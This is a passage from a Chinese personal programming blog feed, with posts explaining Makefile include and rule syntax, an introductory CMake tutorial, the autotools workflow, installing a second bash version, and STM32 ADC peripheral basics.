Makefile</h4><p>使用<code>include</code>关键字可以将其它<code>Makefile</code>包含进来，类似于 C 语言中的<code>#include</code>预处理语句，被包含的文件会自动替换至包含位置。</p><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>include &lt;filename&gt;</span><br></pre></td></tr></tbody></table><p><code>filename</code>可以是当前操作系统 Shell 命令或者文件（可以包含路径和通配符），<code>include</code>关键字之前可以存在空字符，但是绝不允许出现【Tab】键。</p><p>例如：存在 4 个 Makefile<code>a.mk</code>、<code>b.mk</code>、<code>c.mk</code>、<code>foo.make</code>以及 1 个变量<code>$(bar)</code>（包含<code>e.mk</code>和<code>f.mk</code>） ，那么下面 2 条语句就是等价的：</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span><span>include</span> foo.make *.mk <span>$(bar)</span></span><br><span>                ⇓</span><br><span><span>include</span> foo.make a.mk b.mk c.mk e.mk f.mk</span><br></pre></td></tr></tbody></table><p><code>make</code>命令开始执行时，会查找<code>include</code>的其它<code>Makefile</code>，如果没有指定绝对或者相对路径的话，<code>make</code>会首先在当前目录下查找，如果没有查询到则会进入如下目录：</p><ul><li>如果<code>make</code>命令执行时，带有<code>-I</code>或者<code>--include-dir</code>参数，那么<code>make</code>就会在该参数指定的目录下查找；</li><li>此外，<code>make</code>还会去查找<code>&lt;prefix&gt;/include</code>目录（通常为<code>/usr/local/bin</code>或者<code>/usr/include</code>）；</li></ul><p>最后，如果文件未能找到，<code>make</code>将会生成警告信息，然后继续载入其它文件，一旦<code>makefile</code>读取完成，<code>make</code>会再次进行查询，如果依然未能找到，则报出一条致命错误信息。如果想让<code>make</code>忽略读取错误，则可以在<code>include</code>前添加减号<code>-</code>。</p><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span><span>-include</span> &lt;filename&gt;</span><br></pre></td></tr></tbody></table><blockquote><p><strong>注意</strong>：其它版本<code>make</code>采用的兼容命令是<code>sinclude</code>，其作用与<code>-include</code>相同。</p></blockquote><p>这里，重新再来总结一下 GNU Make 的工作步骤：</p><ol><li>读取所有<code>Makefile</code>文件；</li><li>查找被<code>include</code>的其它<code>Makefile</code>；</li><li>初始化<code>Makefile</code>文件当中定义的变量；</li><li>分析并且推导隐式规则；</li><li>创建<code>target</code>目标文件的依赖关系；</li><li>根据依赖关系，决定哪些<code>target</code>需要重新生成；</li></ol><h4 id="MAKEFILES-环境变量"><a href="#MAKEFILES-环境变量" class="headerlink" title="MAKEFILES 环境变量"></a>MAKEFILES 环境变量</h4><p>如果当前定义了<code>MAKEFILES</code>环境变量，其值为采用<strong>空格</strong>分隔的其它<code>Makefile</code>，执行<code>make</code>时会将这个该环境变量的值<code>include</code>进来。但是与<code>include</code>所不同的是，该环境变量引入的<code>Makefile</code>的<code>target</code>不会生效，其定义的文件如果发现错误，<code>make</code>也会不理会。</p><p>日常开发环境，不建议使用<code>MAKEFILES</code>环境变量，因为定义后会影响到所有<code>make</code>命令的执行。反而是在<code>makefile</code>文件出现一些莫名其妙错误的时候，需要检查当前是否定义了这个环境变量。</p><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p><strong>规则</strong>描述了<code>Makefile</code>文件的依赖关系以及如何生成目标文件。定义在 Makefile 中的<code>target</code>可以有很多，但是第 1 条规则中的<code>target</code>会被确立为最终的目标。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></pre></td><td><pre><span></span><br><span>targets : prerequisites</span><br><span>    command</span><br><span>    ...</span><br><span></span><br><span></span><br><span>targets : prerequisites ; command</span><br><span>    command</span><br><span>    ...</span><br></pre></td></tr></tbody></table><ul><li><code>targets</code>：<strong>目标文件名称</strong>，以空格分隔，可以使用通配符；</li><li><code>prerequisites</code>：<strong>目标文件的依赖</strong>，如果某个依赖文件比目标文件要新，那么就会重新进行生成；</li><li><code>command</code>：<strong>Shell 命令行</strong>，如果不与<code>target : prerequisites</code>在一行，那么必须以【Tab】开头；如果保持在一行，则可以采用分号<code>;</code>进行分隔；</li></ul><blockquote><p><strong>注意</strong>：如果<code>prerequisites</code>和<code>command</code>过长，可以使用反斜杠<code>\</code>进行换行。通常<code>make</code>会以 Bash Shell 也就是<code>/bin/sh</code>来执行命令。</p></blockquote><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><p><code>make</code>支持<code>*</code>、<code>?</code>、<code>~</code>三个通配符。<code>~</code>字符在 Linux 下表示当前用户的<code>$HOME</code>目录，在 Windows 下则根据环境变量<code>HOME</code>设置而定。</p><p>通配符可以应用在<code>command</code>当中，下面代码会在清除所有<code>.o</code>文件之前，查看一下<code>main.c</code>文件。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span><span>clean:</span></span><br><span>    cat main.c</span><br><span>    rm -f *.o</span><br></pre></td></tr></tbody></table><p>通配符还可以应用于<code>prerequisites</code>，下面代码中的<code>print</code>目标依赖于所有<code>.c</code>文件，其中的<code>$?</code>是后续将会讲到的<strong>自动化变量</strong>。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span><span>print: *.c</span></span><br><span>    lpr -p <span>$?</span></span><br><span>    touch print</span><br></pre></td></tr></tbody></table><p>通配符同样可以应用在变量中，但是并不会因此而自动展开，下面代码里变量<code>objects</code>的值就是<code>*.o</code>。</p><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>objects = *.o</span><br></pre></td></tr></tbody></table><p>如果需要让通配符在变量当中展开，即让<code>objects</code>的值是所有<code>.o</code>文件名的集合。</p><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>objects := <span>$(<span>wildcard</span> *.o)</span></span><br></pre></td></tr></tbody></table><hr><h2 id="Autoconf"><a href="#Autoconf" class="headerlink" title="Autoconf"></a>Autoconf</h2><p><a href="http://www.gnu.org/software/autoconf/">autoconf</a></p><h2 id="Automake"><a href="#Automake" class="headerlink" title="Automake"></a>Automake</h2><p><a href="http://www.gnu.org/software/automake/">automake</a></p><h2 id="CMake"><a href="#CMake" class="headerlink" title="CMake"></a>CMake</h2><p>CMake 教程提供了一个循序渐进的指南，涵盖了常见的构建系统问题。本文涉及的示例代码可以在 <a href="https://cmake.org/download/">CMake 源码树</a>的<code>Help/guide/tutorial</code>目录下找到，每个步骤都拥有其相应的子目录，循序渐进直至提供完整的解决方案。</p><h3 id="基本出发点"><a href="#基本出发点" class="headerlink" title="基本出发点"></a>基本出发点</h3><p>最为基础的项目是从源代码构建可执行文件，这样只需要一个 3 行的<code>CMakeLists.txt</code>文件，这将是整个教程的起点。在【Step1】目录当中创建如下<code>CMakeLists.txt</code>文件：</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></pre></td><td><pre><span><span>cmake_minimum_required</span>(VERSION <span>3.10</span>)</span><br><span></span><br><span></span><br><span><span>project</span>(Tutorial)</span><br><span></span><br><span></span><br><span><span>add_executable</span>(Tutorial tutorial.cxx)</span><br></pre></td></tr></tbody></table><p>CMake 支持<strong>大写</strong>、<strong>小写</strong>、<strong>混合大小写</strong>的命令，上面的<code>CMakeLists.txt</code>文件使用了小写命令。教程源代码<code>Step1</code>目录中提供了用于执行数字平方根计算的<code>cxx</code>文件。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></pre></td><td><pre><span></span><br><span><span>#<span>include</span> <span>&lt;cmath&gt;</span></span></span><br><span><span>#<span>include</span> <span>&lt;cstdlib&gt;</span></span></span><br><span><span>#<span>include</span> <span>&lt;iostream&gt;</span></span></span><br><span><span>#<span>include</span> <span>&lt;string&gt;</span></span></span><br><span></span><br><span><span><span>int</span> <span>main</span><span>(<span>int</span> argc, <span>char</span>* argv[])</span> </span>{</span><br><span>  <span>if</span> (argc &lt; <span>2</span>) {</span><br><span>    std::cout &lt;&lt; <span>"Usage: "</span> &lt;&lt; argv[<span>0</span>] &lt;&lt; <span>" number"</span> &lt;&lt; std::endl;</span><br><span>    <span>return</span> <span>1</span>;</span><br><span>  }</span><br><span></span><br><span>  <span>const</span> <span>double</span> inputValue = <span>atof</span>(argv[<span>1</span>]);       </span><br><span>  <span>const</span> <span>double</span> outputValue = <span>sqrt</span>(inputValue);   </span><br><span>  std::cout &lt;&lt; <span>"The square root of "</span> &lt;&lt; inputValue &lt;&lt; <span>" is "</span> &lt;&lt; outputValue</span><br><span>            &lt;&lt; std::endl;</span><br><span>  <span>return</span> <span>0</span>;</span><br><span>}</span><br></pre></td></tr></tbody></table><h4 id="添加版本号和配置头文件"><a href="#添加版本号和配置头文件" class="headerlink" title="添加版本号和配置头文件"></a>添加版本号和配置头文件</h4><p>我们要添加的第一个特性是为项目提供 1 个版本号。虽然源代码中也可以完成这件事，但是使用<code>CMakeLists.txt</code>可以提供更好的灵活性。首先，修改<code>CMakeLists.txt</code>文件，使用<code>project()</code>命令设置项目名称和版本号。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></pre></td><td><pre><span><span>cmake_minimum_required</span>(VERSION <span>3.10</span>)</span><br><span></span><br><span></span><br><span><span>project</span>(Tutorial VERSION <span>1.0</span>)</span><br></pre></td></tr></tbody></table><p>然后，继续编写配置，把一个头文件上保存的版本号传递到源代码：</p><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span><span>configure_file</span>(TutorialConfig.h.in TutorialConfig.h)</span><br></pre></td></tr></tbody></table><p>由于配置文件将会被写入到二叉树，所以必须将该目录添加至搜索包含文件的路径列表当中，在<code>CMakeLists.txt</code>文件的末尾添加以下行：</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span><span>target_include_directories</span>(Tutorial PUBLIC</span><br><span>                           <span>"${PROJECT_BINARY_DIR}"</span></span><br><span>                          )</span><br></pre></td></tr></tbody></table><p>在当前目录下创建<code>TutorialConfig.h</code>文件，并且包含如下内容：</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br></pre></td><td><pre><span>/* 配置主、副版本号 */</span><br><span></span><br><span></span><br></pre></td></tr></tbody></table><p>当 CMake 配置该头文件以后，上述的<code>@Tutorial_VERSION_MAJOR@</code>和<code>@Tutorial_VERSION_MINOR@</code>的值将会被替换。</p><p>接下来修改<code>tutorial.cxx</code>来包含上面的<code>TutorialConfig.h</code>头文件，并最终通过修改后的<code>tutorial.cxx</code>打印版本号。</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></pre></td><td><pre><span><span>#<span>include</span> <span>"TutorialConfig.h"</span></span></span><br><span></span><br><span><span>if</span> (argc &lt; <span>2</span>) {</span><br><span>   </span><br><span>   std::cout &lt;&lt; argv[<span>0</span>] &lt;&lt; <span>" Version "</span> &lt;&lt; Tutorial_VERSION_MAJOR &lt;&lt; <span>"."</span></span><br><span>             &lt;&lt; Tutorial_VERSION_MINOR &lt;&lt; std::endl;</span><br><span>   std::cout &lt;&lt; <span>"Usage: "</span> &lt;&lt; argv[<span>0</span>] &lt;&lt; <span>" number"</span> &lt;&lt; std::endl;</span><br><span>   <span>return</span> <span>1</span>;</span><br><span>}</span><br></pre></td></tr></tbody></table><h4 id="指定-C-标准"><a href="#指定-C-标准" class="headerlink" title="指定 C++ 标准"></a>指定 C++ 标准</h4><p>接下来，将<code>tutorial.cxx</code>文件中的<code>atof</code>替换为<code>std::stod</code>，从而为项目添加一些 C++11 特性。同时，删除<code>#include &lt;cstdlib&gt;</code>。</p><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span><span>const</span> <span>double</span> inputValue = std::<span>stod</span>(argv[<span>1</span>]);</span><br></pre></td></tr></tbody></table><p>CMake 中启用特定 C++ 标准支持的最简单方法是使用<code>CMAKE_CXX_STANDARD</code>变量，这里将<code>CMakeLists.txt</code>文件里的<code>CMAKE_CXX_STANDARD</code>变量设置为<code>11</code>，并将<code>CMAKE_CXX_STANDARD_REQUIRED</code>设置为<code>True</code>：</p><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></pre></td><td><pre><span><span>cmake_minimum_required</span>(VERSION <span>3.10</span>)</span><br><span></span><br><span># 设置项目名称与版本</span><br><span><span>project</span>(Tutorial VERSION <span>1.0</span>)</span><br><span></span><br><span># 指定 C++ 标准</span><br><span><span>set</span>(CMAKE_CXX_STANDARD <span>11</span>)</span><br><span><span>set</span>(CMAKE_CXX_STANDARD_REQUIRED True)</span><br></pre></td></tr></tbody></table><h4 id="编译与测试"><a href="#编译与测试" class="headerlink" title="编译与测试"></a>编译与测试</h4><p>从命令行导航到 CMake 源代码树的 Help&#x2F;guide&#x2F;tutorial 目录，并运行以下命令:</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://modern-cmake-cn.github.io/Modern-CMake-zh_CN/README_GitBook.html">中文翻译教程</a></p><p><a href="https://github.com/shendeguize/CMakeTutorialCN">中文教程</a></p><p><a href="http://file.ncnynl.com/ros/CMake%20Practice.pdf">http://file.ncnynl.com/ros/CMake%20Practice.pdf</a></p><p><a href="https://cmake.org/cmake/help/latest/guide/tutorial/index.html">官方教程</a></p><p><a href="https://blog.arg.pub/2022/05/13/cmake/%E5%BF%AB%E9%80%9F%E6%8E%8C%E6%8F%A1CMake%E3%80%8C%E4%B8%80%E3%80%81%E8%B5%B7%E6%AD%A5%E3%80%8D/">优秀博客</a></p><p><a href="https://www.worldhello.net/2010/04/07/954.html">自动生成Makefile</a></p><p><a href="https://subingwen.cn/cmake/CMake-primer/?highlight=cmake">Cmake保姆级教程上</a></p><p><a href="https://subingwen.cn/cmake/CMake-advanced/?spm=a2c6h.12873639.article-detail.8.55bf57adxN9G4M">Cmake保姆级教程上</a></p><p><a href="https://www.owalle.com/2023/02/16/autotools-cmake/">Autotool和Cmake对比</a></p><p><a href="https://github.com/shendeguize/CMakeTutorialCN">Github上的个人教程</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux中的autotools工具集</title>
    <link href="/2023/12/05/Linux%E4%B8%AD%E7%9A%84autotools%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
    <url>/2023/12/05/Linux%E4%B8%AD%E7%9A%84autotools%E5%B7%A5%E5%85%B7%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>Linux下的Makefile相关工具，更加快速、便捷的生成Makefile文件</p><span id="more"></span><h1 id="aotutools系列工具"><a href="#aotutools系列工具" class="headerlink" title="aotutools系列工具"></a>aotutools系列工具</h1><ul><li>aclocal</li><li>autoscan</li><li>autoconf</li><li>autoheader</li><li>automake</li></ul><p>这些工具和相关文件之间的关系：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312051709621.png"></p><p><strong>注意图中的config.in.h文件名是错误的，正确的应该是config.h.in</strong></p><h1 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h1><p>根据上面的那张图我们大致可以知道，这些命令的使用顺序。</p><p>这里只需要注意：</p><p><strong><code>configure.in</code>文件是通过<code>configure.scan</code>文件改名过来的</strong></p><p><strong><code>Makefile.am</code>文件是通过自己创建的</strong></p><h2 id="各个文件的作用以及如何形成的"><a href="#各个文件的作用以及如何形成的" class="headerlink" title="各个文件的作用以及如何形成的"></a>各个文件的作用以及如何形成的</h2><h3 id="configure-scan文件"><a href="#configure-scan文件" class="headerlink" title="configure.scan文件"></a><code>configure.scan</code>文件</h3><p>使用autoscan命令自动生成<code>configure.scan</code>文件 它会在给定目录及其子目录树中检查源文件, 若没有给出目录, 就在当前目录及其子目录树中进行检查。<strong>它会搜索源文件以寻找一般的移植性问题</strong>并创建一个文件”configure.scan”, 该文件就是接下来autoconf要用到的”configure.in”原型。</p><h3 id="configure-in文件"><a href="#configure-in文件" class="headerlink" title="configure.in文件"></a><code>configure.in</code>文件</h3><p>这个文件是<code>configure.scan</code>通过改名的来，当然其还要咋源文件的基础上进行一些修改。</p><p>添加如下内容：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">#AC_INIT([FULL-PACKAGE-NAME], [VERSION], [BUG-REPORT-ADDRESS])<br>AC_INIT(hello,1.0)<br>AM_INIT_AUTOMAKE(hello,1.0)<br>AC_CONFIG_SRCDIR([hello.c])<br>AC_CONFIG_HEADERS([config.h])<br></code></pre></td></tr></table></figure><p>AC_PREREQ宏声明本文要求的autoconf版本, 如本例中的版本 2.65</p><p>AC_INIT宏用来定义软件的名称和版本等信息, 在本例中省略了</p><p>BUG-REPROT-ADDRESS, 一般为作者的E-mail</p><p>AM_INIT_AUTOMAKE是手动添加的, 它是automake所必备的宏, 也同前面一样, PACKAGE是所要产生软件套件的名称,VERSION是版本编号.</p><p>AC_CONFIG_SCRDIR宏用来侦测所指定的源码文件是否存在, 来确定源码目录的有效性. 在此处指当前目录下hello.c</p><p>AC_CONFIG_FILES宏用于生成相应的Makefile文件.</p><h3 id="aclocal-m4文件"><a href="#aclocal-m4文件" class="headerlink" title="aclocal.m4文件"></a><code>aclocal.m4</code>文件</h3><p>m4是传统Unix的宏处理的安装启动的应用，其对应的是.m4文件,它记录了很多无法理解的宏。</p><p>这个文件通过命令<code>aclocal</code>来生成。</p><p>主要作用是：<br><strong>处理本地的宏定义</strong></p><h3 id="Makefile-am文件"><a href="#Makefile-am文件" class="headerlink" title="Makefile.am文件"></a><code>Makefile.am</code>文件</h3><p>这个文件是用户自己生成的，其内容为：</p><h3 id="configure文件"><a href="#configure文件" class="headerlink" title="configure文件"></a><code>configure</code>文件</h3><p>这个文件是在<code>acloal.m4</code>和<code>configure.in</code>两个文件的基础上使用命令<code>autoconf</code>生成的</p><p>主要作用是：<br>生成了之后直接使用的可执行文件</p><h3 id="config-h-in文件"><a href="#config-h-in文件" class="headerlink" title="config.h.in文件"></a><code>config.h.in</code>文件</h3><p>这个文件通过运行autoheader命令, 生成config.h.in文件. 该工具通常会从<code>acconfig.h</code>文件中复制用户附加的符号定义. 本例中没有附加的符号定义, 所以不需要创建<code>acconfig.h</code>文件。</p><h3 id="Makefile-in文件"><a href="#Makefile-in文件" class="headerlink" title="Makefile.in文件"></a><code>Makefile.in</code>文件</h3><p>这个文件通过命令<code>automake</code>生成，其需要一个前提文件<code>Makefile.am</code>，这个命令需要用户自己创建、编写。</p><h3 id="Makefile文件"><a href="#Makefile文件" class="headerlink" title="Makefile文件"></a><code>Makefile</code>文件</h3><p>这是最后一步，通过运行<code>./configure</code>文件直接生成makefile文件。</p><h1 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h1><p>使用aotutools工具链自动生成的，<code>Makefile</code>文件中可以使用一下已经定义好的命令：</p><ol><li><p>make 编译源程序, 键入make, 默认执行”make all”命令</p></li><li><p>make install 执行该命令, 可以把程序安装到系统目录中</p></li><li><p>make dist 将程序和相关的文档打包为一个压缩文档以供发布</p></li><li><p>make clean 清除之前所编译的可执行文件及目标文件</p></li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.worldhello.net/2010/04/07/954.html">https://www.worldhello.net/2010/04/07/954.html</a></p><p><a href="https://www.gnu.org/software/automake/manual/html_node/Autotools-Introduction.html">https://www.gnu.org/software/automake/manual/html_node/Autotools-Introduction.html</a></p><p><a href="https://www.lrde.epita.fr/~adl/dl/autotools.pdf">https://www.lrde.epita.fr/~adl/dl/autotools.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记在Linux安装多个版本的bash</title>
    <link href="/2023/12/05/%E8%AE%B0%E5%9C%A8Linux%E5%AE%89%E8%A3%85%E5%A4%9A%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84bash/"/>
    <url>/2023/12/05/%E8%AE%B0%E5%9C%A8Linux%E5%AE%89%E8%A3%85%E5%A4%9A%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84bash/</url>
    
    <content type="html"><![CDATA[<p>记在Linux安装多个版本的bash</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首先是我想要调试bash这个程序，然后我在网上找到了这个<a href="https://sourceforge.net/projects/bashdb/files/bashdb/">程序</a>可以调试bash。但是其只可以调试特定版本的bash，所以我又装了一个5.0版本的bash</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="去gnu项目官网下载bash5-0版本的源码"><a href="#去gnu项目官网下载bash5-0版本的源码" class="headerlink" title="去gnu项目官网下载bash5.0版本的源码"></a>去gnu项目官网下载bash5.0版本的源码</h2><h2 id="configure-usr-local-bin-将bash5-0安装至此"><a href="#configure-usr-local-bin-将bash5-0安装至此" class="headerlink" title="./configure /usr/local/bin/将bash5.0安装至此"></a><code>./configure /usr/local/bin/</code>将bash5.0安装至此</h2><h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><h2 id="make-install"><a href="#make-install" class="headerlink" title="make install"></a>make install</h2><h2 id="最重要的一步"><a href="#最重要的一步" class="headerlink" title="最重要的一步"></a>最重要的一步</h2><p><code>sudo vim /etc/shells</code>在这个文件中添加<code>/usr/local/bin/bash</code>不然后续我们<code>chsh -s /usr/local/bin</code>的时候会报错说：这个bash无效。</p><h2 id="最后一步"><a href="#最后一步" class="headerlink" title="最后一步"></a>最后一步</h2><p><code>chsh -s /usr/local/bin/bash</code>转换bash，重启shell终端</p><p>如何查看当前bash的版本是否是<code>5.0</code>：<br><code>echo $&#123;BASH_VERSION&#125;</code>这里不要使用<code>bash --version</code>因为，<code>bash</code>已经被重命名为你之前的<code>bash</code>版本了，如果你使用这个方法你会看到你之前版本的<code>bash</code>号</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
      <category>问题总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记在vscode中重定向printf函数</title>
    <link href="/2023/12/03/%E8%AE%B0%E5%9C%A8vscode%E4%B8%AD%E9%87%8D%E5%AE%9A%E5%90%91printf%E5%87%BD%E6%95%B0/"/>
    <url>/2023/12/03/%E8%AE%B0%E5%9C%A8vscode%E4%B8%AD%E9%87%8D%E5%AE%9A%E5%90%91printf%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>记在vscode中重定向printf函数</p><span id="more"></span><h1 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h1><p><a href="https://zhuanlan.zhihu.com/p/628628503">https://zhuanlan.zhihu.com/p/628628503</a></p><p><a href="https://www.cnblogs.com/Luad/p/12635132.html">https://www.cnblogs.com/Luad/p/12635132.html</a></p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>问题总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ADC外设</title>
    <link href="/2023/12/02/ADC%E5%A4%96%E8%AE%BE/"/>
    <url>/2023/12/02/ADC%E5%A4%96%E8%AE%BE/</url>
    
    <content type="html"><![CDATA[<p>总结stm32中的ADC设备</p><span id="more"></span><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>ADC：模数转换器，其是一个片上外设</p><p>STM32f103 系列有3个ADC，精度为12位，每个ADC最多有16个外部通道。其中ADC1和ADC2都有16个外部通道， ADC3根据CPU引脚的不同通道数也不同，一般都有8个外部通道。</p><p>其主要包含的内容有：</p><ul><li>测量的范围</li><li>准备工作</li><li>如何触发转换</li><li>如何处理转换</li><li>数据如何传入</li><li>数据如何传出</li><li>中断</li></ul><h1 id="测量的范围"><a href="#测量的范围" class="headerlink" title="测量的范围"></a>测量的范围</h1><p>在stm32zet6的ADC中，电压的测量范围是<strong>0v~3.3V</strong>，想要测量扩大范围，只需要使用外部电路进行升、降压至0~3.3v即可。</p><hr><h1 id="如何触发"><a href="#如何触发" class="headerlink" title="如何触发"></a>如何触发</h1><h2 id="ADC的触发源包括了：-ADC转换可以由ADC控制寄存器2-ADC-CR2的ADON这个位来控制，-写1的时候开始转换，写0的时候停止转换-其实就是软件触发-内部定时器触发-外部IO触发"><a href="#ADC的触发源包括了：-ADC转换可以由ADC控制寄存器2-ADC-CR2的ADON这个位来控制，-写1的时候开始转换，写0的时候停止转换-其实就是软件触发-内部定时器触发-外部IO触发" class="headerlink" title="ADC的触发源包括了：- ADC转换可以由ADC控制寄存器2: ADC_CR2的ADON这个位来控制， 写1的时候开始转换，写0的时候停止转换.其实就是软件触发- 内部定时器触发- 外部IO触发"></a>ADC的触发源包括了：<br>- ADC转换可以由ADC控制寄存器2: ADC_CR2的ADON这个位来控制， 写1的时候开始转换，写0的时候停止转换.<strong>其实就是软件触发</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ADC_SoftwareStartConvCmd(ADCx, ENABLE);<br></code></pre></td></tr></table></figure><br>- 内部定时器触发<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><br>- 外部IO触发</h2><h1 id="输入通道"><a href="#输入通道" class="headerlink" title="输入通道"></a>输入通道</h1><p>信号输入的通道，<strong>STM32的ADC多达18个通道</strong>，这18个通道又分为外部通道和内部通道。</p><p>其中<strong>外部的16个通道</strong>就是框图中的ADCx_IN0、ADCx_IN1…ADCx_IN5。这16个通道对应着不同的IO口，具体是哪一个IO口可以从手册查询到。</p><p>其中ADC1&#x2F;2&#x2F;3还有<strong>内部通道</strong>：ADC1的通道16连接到了芯片内部的温度传感器，Vrefint连接到了通道17。 ADC2的模拟通道16和17连接到了内部的VSS。ADC3的模拟通道9、14、15、16和17连接到了内部的VSS。</p><p>外部的16个通道之中又分为了规则通道和注入通道</p><h2 id="规则通道"><a href="#规则通道" class="headerlink" title="规则通道"></a>规则通道</h2><p>规则通道可以有16个，规则通道就是守规则的、按顺序来的通道。</p><h2 id="注入通道"><a href="#注入通道" class="headerlink" title="注入通道"></a>注入通道</h2><p>注入通道最多占用4个通道。注入，可以理解为插入，插队的意思，是一种不安分的通道。它是一种在规则通道转换的时候强行插入要转换的一种通道。 如果在规则通道转换过程中，有注入通道插队，那么就要先转换完注入通道，等注入通道转换完成后，再回到规则通道的转换流程。 这点跟中断程序很像，都是不安分的主。所以，注入通道只有在规则通道存在时才会出现。</p><hr><h1 id="如何处理转换"><a href="#如何处理转换" class="headerlink" title="如何处理转换"></a>如何处理转换</h1><h2 id="转换顺序"><a href="#转换顺序" class="headerlink" title="转换顺序"></a>转换顺序</h2><h2 id="转换时间"><a href="#转换时间" class="headerlink" title="转换时间"></a>转换时间</h2><h3 id="ADC时钟"><a href="#ADC时钟" class="headerlink" title="ADC时钟"></a>ADC时钟</h3><p>ADC输入时钟ADC_CLK由PCLK2经过分频产生，最大是14M，分频因子由RCC时钟配置寄存器RCC_CFGR的位15:14 ADCPRE[1:0]设置， 可以是2&#x2F;4&#x2F;6&#x2F;8分频，注意这里没有1分频。一般我们设置<strong>PCLK2&#x3D;HCLK&#x3D;72M,所以经过ADC预分频器能分频到最大的时钟只能是12M</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">RCC_APB2PeriphClockCmd(RCC_APB2Periph_ADC2,ENABLE);<br></code></pre></td></tr></table></figure><h3 id="采样时间"><a href="#采样时间" class="headerlink" title="采样时间"></a>采样时间</h3><p>ADC使用一些ADC_CLK周期来进行采样，每个通道都可以配置不同的采样时间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ADC_SoftwareStartConvCmd(ADCx, ENABLE);<span class="hljs-comment">//采样时间和采样顺序的配置</span><br></code></pre></td></tr></table></figure><h1 id="数据输出"><a href="#数据输出" class="headerlink" title="数据输出"></a>数据输出</h1><p>ADC转换后的数据根据转换组的不同，规则组的数据放在ADC_DR寄存器，注入组的数据放在JDRx。</p><h1 id="ADC模式"><a href="#ADC模式" class="headerlink" title="ADC模式"></a>ADC模式</h1><p>ADC有六种基本模式：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312201724071.png"><br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312201725070.png"></p><h2 id="如果不使用双ADC的话就是使用独立模式"><a href="#如果不使用双ADC的话就是使用独立模式" class="headerlink" title="如果不使用双ADC的话就是使用独立模式"></a><strong>如果不使用双ADC的话就是使用独立模式</strong></h2><h1 id="与其他外设之间"><a href="#与其他外设之间" class="headerlink" 